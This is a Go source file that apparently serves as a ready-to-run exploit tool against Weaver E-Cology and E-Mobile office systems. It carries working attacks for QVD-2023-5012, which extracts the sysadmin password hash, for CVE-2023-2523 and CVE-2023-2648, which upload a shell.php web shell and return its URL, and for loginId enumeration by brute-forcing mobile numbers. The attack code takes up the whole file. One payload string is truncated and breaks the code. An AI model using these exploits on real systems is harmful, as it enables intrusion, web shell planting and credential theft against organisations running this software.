package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func QVD_2023_5012(targetURL string) string {
	PocUrl := targetURL + "/mobile/%20/plugin/browser.jsp"
	PocData := "isDis=1&browserTypeId=269&keyword
	data := strings.NewReader(PocData)
	req, err := http.NewRequest("POST", PocUrl, data)
	if err != nil {
		log.Print(err)
		return "err"
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// 解决https证书问题
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		log.Print(err)
		return "err"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Print(err)
		return "err"
	}

	// 获取结果
	reg := regexp.MustCompile("\"show1\":.([^\\\"]+)")
	version := reg.MatchString(string(body))
	regPasswd := regexp.MustCompile(`"show1":"(.*?)"`)
	PassWord := regPasswd.FindStringSubmatch(string(body))
	if resp.StatusCode == 200 && version {
		log.Print("[+] 存在QVD_2023_5012漏洞: ", targetURL)
		log.Print("[+] 获取 sysadmin MD5密码为：", strings.TrimRight(PassWord[1], "%"), " 请自行解密")
		return "[+] 存在QVD_2023_5012漏洞"
	} else {
		log.Print("[-] 不存在QVD_2023_5012漏洞")
		return "[-] 不存在QVD_2023_5012漏洞"
	}
}

func ChangeUserInfo(targetURL string) string {
	PocUrl := targetURL + "/mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile="
	req, err := http.NewRequest("GET", PocUrl, nil)
	if err != nil {
		log.Print(err)
		return "err"
	}

	// 解决https证书问题
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		log.Print(err)
		return "err"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Print(err)
		return "err"
	}

	// 获取结果
	reg := regexp.MustCompile("\"status\":.([^\\\"]+)")
	user := reg.MatchString(string(body))
	if resp.StatusCode == 200 && user {
		log.Print("[+] 存在用户信息泄露漏洞: ", targetURL, " 请执行 getloginid_ofsLogin 爆破 loginId. 配合泛微E-Cology ofsLogin任意用户登录使用")
		return "[+] 存在用户信息泄露漏洞，请执行 getloginid_ofsLogin 爆破 loginId.\n[+] 配合泛微E-Cology ofsLogin任意用户登录使用"
	} else {
		log.Print("[-] 不存在用户信息泄露漏洞")
		return "[-] 不存在用户信息泄露漏洞"
	}
}

func getloginid_ofsLogin(url string, mobile string, i int) int {
	mobile = mobile + fmt.Sprint(i)
	response, err := http.Get(url + "/mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=" + mobile)
	if err != nil {
		return 1
	}
	defer response.Body.Close()

	// Convert response body to string
	buffer := make([]byte, 4096)
	response.Body.Read(buffer)
	responseBody := string(buffer)

	if !(strings.Contains(responseBody, `"status":"1"`) || strings.Contains(responseBody, `"status":"0"`) || strings.Contains(responseBody, `"status":"-1"`)) {
		return 1
	}
	if !strings.Contains(responseBody, "status") {
		return 1
	}
	if strings.Contains(responseBody, "/images/error/404.png") || response.StatusCode != 200 {
		return 1
	}
	if strings.Contains(responseBody, `"status":"1"`) && !strings.Contains(responseBody, "loginId") {
		return 1
	}
	if strings.Contains(responseBody, "loginId") {

		reg := regexp.MustCompile("\"loginId\":.([^\\\"]+)")
		match := reg.FindStringSubmatch(responseBody)
		if len(match) > 1 {
			loginId := match[1]
			fmt.Println("loginId:", loginId) // 打印ID值
		}
	}
	if strings.Contains(responseBody, `"status":"-1"`) {
		return 0
	}
	for j := 0; j < 10; j++ {
		status := getloginid_ofsLogin(url, mobile, j)
		if status == 0 {
			continue
		} else if status == 2 {
			return 2
		}
	}
	return 1
}

func CVE_2023_2523(targetURL string) string {
	// 设置发送的文件路径
	filePath := "shell.php"

	// 调用 NewRequest 方法创建请求对象
	buf := &bytes.Buffer{}
	writer := multipart.NewWriter(buf)

	// 添加文件
	fileWriter, err := writer.CreateFormFile("upload_quwan", filePath)
	if err != nil {
		panic(err)
	}

	// 打开文件并将其复制到表单的字节缓冲区中
	file, err := os.Open(filePath)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	_, err = io.Copy(fileWriter, file)
	if err != nil {
		panic(err)
	}

	// 添加空文件
	writer.CreateFormFile("file", "")

	// 完成表单数据填充
	err = writer.Close()
	if err != nil {
		panic(err)
	}

	// 创建发送 POST 请求
	req, err := http.NewRequest("POST", targetURL+"/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save", buf)
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// 解决https证书问题
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		log.Print(err)
		return "err"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Print(err)
		return "err"
	}
	//判断漏洞是否存在
	reg := regexp.MustCompile("attachment")
	tag := reg.MatchString(string(body))
	if resp.StatusCode == 200 && tag {
		result := string(body)
		var arr []interface{}
		if err := json.Unmarshal([]byte(result), &arr); err != nil {
			panic(err)
		}
		id, _ := arr[2].(float64)
		filename, _ := arr[3].(string)
		shellUrl := targetURL + "/attachment/" + fmt.Sprintf("%.0f", id) + "/" + filename
		log.Println("[+] 存在CVE-2023-2523漏洞：", shellUrl)
		return shellUrl
	} else {
		log.Println("[-] 不存在CVE-2023-2523漏洞")
		return "[-] 不存在CVE-2023-2523漏洞"
	}

}

func CVE_2023_2648(targetURL string) string {
	// 设置发送的文件路径
	filePath := "shell.php"
	// 调用 NewRequest 方法创建请求对象
	buf := &bytes.Buffer{}
	writer := multipart.NewWriter(buf)
	// 添加文件
	fileWriter, err := writer.CreateFormFile("Filedata", filePath)
	if err != nil {
		panic(err)
	}

	// 打开文件并将其复制到表单的字节缓冲区中
	file, err := os.Open(filePath)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	_, err = io.Copy(fileWriter, file)
	if err != nil {
		panic(err)
	}

	// 检查是否有错误发生
	if err := writer.Close(); err != nil {
		panic(err)
	}

	// 添加空文件
	writer.CreateFormFile("file", "")

	// 完成表单数据填充
	err = writer.Close()
	if err != nil {
		panic(err)
	}

	req, err := http.NewRequest("POST", targetURL+"/inc/jquery/uploadify/uploadify.php", buf)
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// 解决https证书问题
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		log.Print(err)
		return "err"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Print(err)
		return "err"
	}
	match, _ := regexp.MatchString(`^\d{10}$`, string(body))
	if resp.StatusCode == 200 && match {
		shellUrl := targetURL + "/attachment/" + string(body) + "/" + filePath
		log.Println("[+] 存在CVE-2023-2648漏洞：", shellUrl)
		return shellUrl
	} else {
		log.Println("[-] 不存在CVE-2023-2648漏洞")
		return "[-] 不存在CVE-2023-2648漏洞"
	}

}

var (
	targeturl string
	file      string
)

func main() {
	target := flag.String("target", "", "指定目标")
	funcName := flag.String("poc", "", "指定要执行的函数名称")
	flag.Parse()

	// 根据命令行参数执行对应的函数
	switch *funcName {
	case "QVD-2023-5012":
		QVD_2023_5012(*target)
	case "CVE-2023-2523":
		CVE_2023_2523(*target)
	case "CVE-2023-2648":
		CVE_2023_2648(*target)
	case "ChangeUserInfo":
		ChangeUserInfo(*target)
	case "getloginid_ofsLogin":
		for i := 0; i < 10; i++ {
			getloginid_ofsLogin(*target, "", i)
		}
	default:
		// 未指定函数或函数名错误时，默认执行所有函数各一次
		ChangeUserInfo(*target)
		QVD_2023_5012(*target)
		CVE_2023_2523(*target)
		CVE_2023_2648(*target)
	}
}
